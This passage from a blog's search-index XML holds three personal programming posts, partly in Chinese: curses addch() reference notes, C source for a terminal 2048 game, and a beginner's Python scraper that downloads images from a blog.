mvwaddch(), waddch(), wechochar() 1234567891011121314//SYNOPSIS#include &lt;curses.h&gt;int addch(chtype ch);int waddch(WINDOW *win, chtype ch);int mvaddch(int y, int x, chtype ch);int mvwaddch(WINDOW *win, int y, int x, chtype ch);int echochar(chtype ch);int wechochar(WINDOW *win, chtype ch); DESCRIPTIONThe addch(), waddch(), mvaddch() and mvwaddch() routines put the character ch into the given window at its current window position, which is then advanced. They are analogous to putchar() in stdio(). If the advance is at the right margin, the cursor automatically wraps to the beginning of the next line. At the bottom of the current scrolling region, if scrollok() is enabled, the scrolling region is scrolled up one line. If ch is a tab, newline, or backspace, the cursor is moved appropriately within the window. Backspace moves the cursor one character left; at the left edge of a window it does nothing. Newline does a clrtoeol(), then moves the cursor to the window left margin on the next line, scrolling the window if on the last line). Tabs are considered to be at every eighth column. If ch is any control character other than tab, newline, or backspace, it is drawn in ^X notation. Calling winch() after adding a control character does not return the character itself, but instead returns the ^-representation of the control character. (To emit control characters literally, use echochar().) Video attributes can be combined with a character argument passed to addch() or related functions by logical-ORing them into the character. (Thus, text, including attributes, can be copied from one place to another using inch() and addch().). See the curs_attr() page for values of predefined video attribute constants that can be usefully OR&#x2019;ed into characters. The echochar() and wechochar() routines are equivalent to a call to addch() followed by a call to refresh(), or a call to waddch() followed by a call to wrefresh(). The knowledge that only a single character is being output is used and, for non-control characters, a considerable performance gain may be seen by using these routines instead of their equivalents. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[using c++ to realize 2048]]></title>
    <url>%2F2018%2F09%2F29%2Fusing-c-to-realize-2048%2F</url>
    <content type="text"><![CDATA[&#x4ECA;&#x5929;&#xFF0C;&#x5B66;&#x4E60;&#x4E86;&#x600E;&#x4E48;&#x7528;c&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;2048&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x5C0F;&#x6E38;&#x620F;&#x4E86;&#x3002;&#x867D;&#x7136;&#xFF0C;&#x81EA;&#x5DF1;&#x73B0;&#x5728;&#x8FD8;&#x6CA1;&#x6709;&#x52A8;&#x624B;&#x81EA;&#x5DF1;&#x53BB;&#x5F00;&#x53D1;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x5F53;&#x81EA;&#x5DF1;&#x7167;&#x7740;&#x88AB;&#x4EBA;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x5199;&#x51FA;&#x6765;&#x6E38;&#x620F;&#xFF0C;&#x81EA;&#x5DF1;&#x73A9;&#x7740;&#x8FD8;&#x662F;&#x5F88;&#x5F00;&#x5FC3;&#x7684;&#x3002;&#x6700;&#x5173;&#x952E;&#x7684;&#x662F;&#xFF0C;&#x81EA;&#x5DF1;&#x53EF;&#x4EE5;&#x5728;&#x6E38;&#x620F;&#x4E2D;&#xFF0C;&#x52A0;&#x4E00;&#x4E9B;&#x522B;&#x4EBA;&#x610F;&#x60F3;&#x4E0D;&#x5230;&#x7684;&#x4E1C;&#x897F;^*^&#x4EE3;&#x7801;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;curses.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;int a[4][4] = {0};int empty;int old_y, old_x;void draw(); // &#x7ED8;&#x5236;&#x6E38;&#x620F;&#x754C;&#x9762;void play();void init(); // &#x521D;&#x59CB;&#x5316;void draw_one(int y, int x);void cnt_value(int *new_y, int *new_x);int game_over();int cnt_one(int y, int x);int endwin();int main() { init(); play(); endwin(); return 0;}void init(){ int x, y; initscr(); cbreak(); noecho(); curs_set(0); empty = 15; // &#x6807;&#x8BB0;&#x5F53;&#x524D;&#x5B58;&#x5728;&#x7684;&#x7A7A;&#x4F4D;&#x7F6E;&#xFF0C;&#x82E5;&#x4E3A;15&#x5219;&#x6E38;&#x620F;&#x7ED3;&#x675F; srand(time(0)); x = rand() % 4; // rand()&#x51FD;&#x6570;&#x751F;&#x6210;&#x968F;&#x673A;&#x6570; y = rand() % 4; // &#x968F;&#x673A;&#x751F;&#x6210;&#x7684;&#x4F4D;&#x7F6E; a[y][x] = 2; // &#x5C06;&#x5176;&#x76D8;&#x4E2D;&#x7684;&#x8BE5;&#x4F4D;&#x7F6E;&#x8D4B;&#x503C; draw();}void draw(){ int n, m, x, y; char c[4] = {&apos;0&apos;, &apos;0&apos;, &apos;0&apos;, &apos;0&apos;}; clear(); for(n = 0; n &lt; 9; n += 2) // &#x7ED8;&#x5236;&#x884C; for(m = 0; m &lt; 21; m++) { move(n, m); addch(&apos;-&apos;); refresh(); } for(m = 0; m &lt; 22; m += 5) // &#x7ED8;&#x5236;&#x5217; for(n = 1; n &lt; 8; n++) { move(n, m); addch(&apos;|&apos;); refresh(); } for(y = 0; y &lt; 4; y++) for(x = 0; x &lt; 4; x++) { draw_one(y, x); }}void draw_one(int y, int x){ int i, m, k, j; int num; char c[5] = {0x00}; num = i = a[y][x]; m = 0; while(i &gt; 0) { j = i % 10; c[m++] = j + &apos;0&apos;; i = i / 10; } m = 0; k = (x + 1) * 5 - 1; while(c[m] != 0x00) { move(2*y+1, k); addch(c[m++]); // &#x5C06;&#x5B57;&#x7B26;&#x6DFB;&#x52A0;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x4F4D;&#x7F6E; if (num == 2048) { move( 15, 15 ); printw( &quot;%s&quot;, &quot;niconiconiconi!!!!&quot; ); } k--; }}void play(){ int x, y, i, new_x, new_y, temp; int old_empty, move; char ch; while(1) { move = 0; old_empty = empty; ch = getch(); switch(ch) { case 97: // &#x5DE6; case 104: case 68: for(y = 0; y &lt; 4; y++) // &#x904D;&#x5386;&#x6240;&#x6709;&#x7684;&#x4F4D;&#x7F6E; for(x = 0; x &lt; 4; ) { if(a[y][x] == 0) // &quot;0 0 2 2&quot; &#x7B2C;&#x4E00;&#x4E2A;&#x548C;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x5B57;&#x90FD;&#x4E3A;0&#xFF0C; &#x4E0B;&#x6B21;&#x79FB;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x540E;&#x7684;&#x72B6;&#x6001;&quot;4 0 0 0&quot;&quot; { // &#x6B64;&#x5904;&#x597D;&#x50CF;&#x5E76;&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x4E2A;for&#x5FAA;&#x73AF;&#x6700;&#x540E;&#x53EA;&#x80FD;&#x5F97;&#x5230;&quot;0 0 4 0&quot;&quot; x++; continue; } else { for(i = x + 1; i &lt; 4; i++) { if(a[y][i] == 0) { continue; } else { if(a[y][x] == a[y][i]) // &#x5982;&#x679C;&#x4E24;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x5B57;&#x76F8;&#x540C;&#xFF0C; &#x53F3;&#x8FB9;&#x7684;&#x6570;&#x5B57;&#x4E0E;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x5B57;&#x5408;&#x5E76; { a[y][x] += a[y][i]; a[y][i] = 0; empty++; // &#x7A7A;&#x683C;&#x7684;&#x6570;&#x91CF;&#x589E;&#x52A0;1 break; } else { break; } } } x = i; // &quot;4 2 2 8&quot; 4 &#x548C; 2 &#x4E0D;&#x76F8;&#x7B49;&#xFF0C;&#x6B64;&#x5904;&#x7684;x = i&#xFF0C;&#x5C31;&#x6709;&#x4E00;&#x79CD;x++&#x7684;&#x610F;&#x601D;&#x3002; } } for(y = 0; y &lt; 4; y++) // &#x8FD9;&#x91CC;&#x80FD;&#x591F;&#x628A;&#x4E0A;&#x9762;&quot;0 0 4 0&quot;,&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x8F6C;&#x5316;&#x4E3A;&#x2018;4 0 0 0&#x2019;&#x8FD9;&#x79CD;&#x72B6;&#x6001; for(x = 0; x &lt; 4; x++) { if(a[y][x] == 0) { continue; } else { for(i = x; (i &gt; 0) &amp;&amp; (a[y][i-1] == 0); i--) { a[y][i-1] = a[y][i]; a[y][i] = 0; move = 1; //&#x6B64;&#x5904;&#x7684;move&#x7528;&#x6765;&#x6807;&#x8BB0;&#x65B0;&#x72B6;&#x6001;&#x7684;&#x4EA7;&#x751F; } } } break; case 100: // &#x53F3; case 108: case 67: for(y = 0; y &lt; 4; y++) for(x = 3; x &gt;= 0; ) { if(a[y][x] == 0) { x--; continue; } else { for(i = x - 1; i &gt;= 0; i--) { if(a[y][i] == 0) { continue; } else if(a[y][x] == a[y][i]) { a[y][x] += a[y][i]; a[y][i] = 0; empty++; break; } else { break; } } x = i; } } for(y = 0; y &lt; 4; y++) for(x = 3; x &gt;= 0; x--) { if(a[y][x] == 0) { continue; } else { for(i = x; (i &lt; 3) &amp;&amp; (a[y][i+1] == 0); i++) { a[y][i+1] = a[y][i]; a[y][i] = 0; move = 1; } } } break; case 119: // &#x4E0A; case 107: case 65: for(x = 0; x &lt; 4; x++) for(y = 0; y &lt; 4; ) { if(a[y][x] == 0) { y++; continue; } else { for(i = y + 1; i &lt; 4; i++) { if(a[i][x] == 0) { continue; } else if(a[y][x] == a[i][x]) { a[y][x] += a[i][x]; a[i][x] = 0; empty++; break; } else { break; } } y = i; } } for(x = 0; x &lt; 4; x++) for(y = 0; y &lt; 4; y++) { if(a[y][x] == 0) { continue; } else { for(i = y; (i &gt; 0) &amp;&amp; (a[i-1][x] == 0); i--) { a[i-1][x] = a[i][x]; a[i][x] = 0; move = 1; } } } break; case 115: // &#x4E0B; case 106: case 66: for(x = 0; x &lt; 4; x++) for(y = 3; y &gt;= 0; ) { if(a[y][x] == 0) { y--; continue; } else { for(i = y - 1; i &gt;= 0; i--) { if(a[i][x] == 0) { continue; } else if(a[y][x] == a[i][x]) { a[y][x] += a[i][x]; a[i][x] = 0; empty++; break; } else { break; } } y = i; } } for(x = 0; x &lt; 4; x++) for(y = 3; y &gt;= 0; y--) { if(a[y][x] == 0) { continue; } else { for(i = y; (i &lt; 3) &amp;&amp; (a[i+1][x] == 0); i++) { a[i+1][x] = a[i][x]; a[i][x] = 0; move = 1; } } } break; case &apos;Q&apos;: case &apos;q&apos;: game_over(); break; default: continue; break; } if(empty &lt;= 0) game_over(); if((empty != old_empty) || (move == 1)) { do{ new_x = rand() % 4; new_y = rand() % 4; }while(a[new_y][new_x] != 0); // &#x6807;&#x8BB0;&#x968F;&#x673A;&#x4EA7;&#x751F;&#x6570;&#x5B57;&#x4E3A;0&#x7684;&#x4F4D;&#x7F6E; cnt_value(&amp;new_y, &amp;new_x); do { temp = rand() % 4; }while(temp == 0 || temp == 2); a[new_y][new_x] = temp + 1; // &#x5728;&#x627E;&#x7684;&#x7684;&#x4F4D;&#x7F6E;&#x9644;&#x4E0A;&#x65B0;&#x7684;&#x6570;&#x5B57;1&#x6216;3 empty--; } draw(); // &#x5237;&#x65B0;&#x9875;&#x9762; }}int cnt_one(int y, int x) // &#x67E5;&#x627E;&#x8BE5;&#x4F4D;&#x7F6E;&#x5468;&#x56F4;&#x7A7A;&#x4F4D;&#x7F6E;&#x7684;&#x4E2A;&#x6570;{ int value = 0; if(y - 1 &gt; 0) a[y-1][x] ? 0 : value++; if(y + 1 &lt; 4) a[y+1][x] ? 0 : value++; if(x - 1 &gt;= 0) a[y][x-1] ? 0 : value++; if(x + 1 &lt; 4) a[y][x+1] ? 0 : value++; if(y - 1 &gt;= 0 &amp;&amp; x - 1 &gt;= 0) a[y-1][x-1] ? 0 : value++; if(y - 1 &gt;= 0 &amp;&amp; x + 1 &lt; 4) a[y-1][x+1] ? 0 : value++; if(y + 1 &lt; 4 &amp;&amp; x - 1 &gt;= 0) a[y+1][x-1] ? 0 : value++; if(y + 1 &lt; 4 &amp;&amp; x + 1 &lt; 4) a[y+1][x+1] ? 0 : value++; return value;}void cnt_value(int *new_y, int *new_x){ int max_x, max_y, x, y, value; int max = 0; max = cnt_one(*new_y, *new_x); // &#x8BE5;&#x6570;&#x5B57;&#x4E3A;0&#x7684;&#x5143;&#x7D20;&#x7684;&#x5468;&#x56F4;&#x7A7A;&#x4F4D;&#x7F6E;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570; for(y = 0; y &lt; 4; y++) for(x = 0; x &lt; 4; x++) { if(!a[y][x]) // &#x904D;&#x5386;&#x5176;&#x4ED6;&#x6570;&#x5B57;&#x4E3A;0&#x7684;&#x5143;&#x7D20; { value = cnt_one(y, x); if(value &gt; max &amp;&amp; old_y != y &amp;&amp; old_x != x) // &#x627E;&#x5230;&#x5468;&#x56F4;&#x7A7A;&#x4F4D;&#x7F6E;&#x5143;&#x7D20;&#x6700;&#x591A;&#x7684;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E; { *new_y = y; *new_x = x; old_x = x; old_y = y; break; } } }}int game_over(){ sleep(1); endwin(); exit(0);} &#x809A;&#x5B50;&#x6709;&#x70B9;&#x997F;&#x4E86;&#xFF0C;&#x5403;&#x996D;&#x53BB;&#x4E86;&#xFF5E;&#xFF5E;&#xFF5E;&#xFF5E; &#x4ECA;&#x5929;&#x7ED9;&#x4EE3;&#x7801;&#x589E;&#x52A0;&#x4E86;&#x6CE8;&#x91CA;&#xFF0C;&#x5BF9;&#x6574;&#x4E2A;&#x6E38;&#x620F;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x7B97;&#x662F;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x636E;&#x8BF4;&#x82E5;&#x679C;&#x5206;&#x6570;&#x5230;&#x8FBE;2048&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x6709;&#x60CA;&#x559C;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#x53E6;&#x5916;&#x8FD8;&#x5BF9;Linux&#x56FE;&#x5F62;&#x754C;&#x9762;&#x7F16;&#x7A0B;&#x5E93;&#xFF08;curses&#x5E93;&#xFF09;&#x6709;&#x4E86;&#x4E00;&#x4E9B;&#x4E86;&#x89E3;&#x3002; &#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x4F7F;&#x7528;&#x8BE5;&#x5E93;&#x7684;&#x4F8B;&#x5B50;&#x3002;12345678910111213#include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;curses.h&gt; int main() { initscr(); move( 15, 15 ); printw( &quot;%s&quot;, &quot;Hello world&quot; ); refresh(); sleep(10); endwin(); exit(EXIT_SUCCESS);} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>c++</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DIY python 1]]></title>
    <url>%2F2018%2F09%2F27%2FDIY-python-1%2F</url>
    <content type="text"><![CDATA[&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x722C;&#x866B;&#x4E00;&#x76F4;&#x60F3;&#x7528;&#x722C;&#x866B;&#x6765;&#x722C;&#x53D6;&#x4E00;&#x4E0B;&#x522B;&#x4EBA;&#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x81EA;&#x5DF1;&#x559C;&#x6B22;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x6B63;&#x597D;&#x6700;&#x8FD1;&#x53C8;&#x5728;&#x5B66;&#x4E60;&#x7F51;&#x7EDC;&#x722C;&#x866B;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x81EA;&#x5DF1;&#x52A8;&#x624B;&#x5B9E;&#x8DF5;&#x4E86;&#x4E00;&#x4E0B;&#x3002;&#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;^_^&#x6311;&#x4E24;&#x5F20;&#x597D;&#x770B;&#x7684;&#x56FE;&#x7247;&#x5148;&#x8D34;&#x4E0A; &#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;&#x5427;&#x3002; &#x653E;&#x7801;&#x8FC7;&#x6765;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from bs4 import BeautifulSoupimport requestsimport reimport urllibheaders = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36&quot; }unseen = set()seen = sethome_page_url = &quot;https://2heng.xin/&quot;def get_page_url(page_url): try: print(&quot;page_url is &quot; + page_url) html = requests.get(page_url, headers=headers) soup = BeautifulSoup(html.text, features=&quot;html.parser&quot;) url = soup.find(&quot;div&quot;, {&quot;id&quot;: &quot;pagination&quot;}).find(&quot;a&quot;, href=re.compile(&quot;(^(https://2heng.xin/))&quot;)) page_url = url[&apos;href&apos;] get_img_url(page_url) get_page_url(page_url) except: print(&quot;page_url finished!!&quot;)def get_img_url(cur_url): try: curhtml = requests.get(cur_url, headers=headers, stream=True) cursoup = BeautifulSoup(curhtml.text, features=&quot;html.parser&quot;) cururls = cursoup.find(&quot;div&quot;, {&quot;class&quot;: &quot;site-content&quot;}).findAll(&quot;img&quot;, {&quot;class&quot;: &quot;lazyload&quot;}) img_num = download_img(cururls) print(img_num) except: print(&quot;get_img_url finished!!!!&quot;)def download_img(img_urls): img_num = 0 for img_url in img_urls: img_num += 1 url = img_url[&apos;data-src&apos;] try: r = requests.get(url, stream=True) img_name = url.split(&apos;/&apos;)[-1] with open(&apos;./img/MASHIRO/%s&apos; % img_name, &apos;wb&apos;) as f: for chunk in r.iter_content(chunk_size=128): f.write(chunk) print(&quot;finished download &quot; + url) except: print(&quot;this image have some problem!&quot;) return img_numget_page_url(home_page_url) &#x5176;&#x5B9E;&#x4EE3;&#x7801;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x8FD9;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x52A8;&#x624B;&#x6765;&#x7528;&#x4EE3;&#x7801;&#x5E2E;&#x81EA;&#x5DF1;&#x5B8C;&#x6210;&#x4E00;&#x4EF6;&#x4E8B;&#x60C5;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x628A;&#x4EE3;&#x7801;&#x8D34;&#x4E86;&#x51FA;&#x6765;&#x3002;&#x4EE3;&#x7801;&#x5199;&#x7684;&#x6BD4;&#x8F83;&#x51CC;&#x4E71;&#xFF0C;&#x5982;&#x6709;&#x9519;&#x8BEF;&#x8FD8;&#x6B22;&#x8FCE;&#x6307;&#x6B63;@-@ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
